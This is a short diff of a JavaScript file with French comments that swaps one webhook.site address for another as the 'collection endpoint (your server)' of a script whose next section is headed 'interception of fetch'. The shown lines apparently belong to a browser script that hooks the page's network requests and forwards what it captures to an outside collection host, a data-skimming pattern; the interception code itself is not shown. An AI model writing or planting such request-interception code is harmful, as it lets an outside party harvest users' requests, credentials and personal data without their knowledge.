@@ -1,6 +1,6 @@
 (function() {
   // Endpoint de collecte (ton serveur)
-  const hookEndpoint = "https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8";
+  const hookEndpoint = "https://webhook.site/a3d6d9f6-4141-47bd-a203-441b22ec5126";
 
   // ---------------------------
   // Interception de fetch
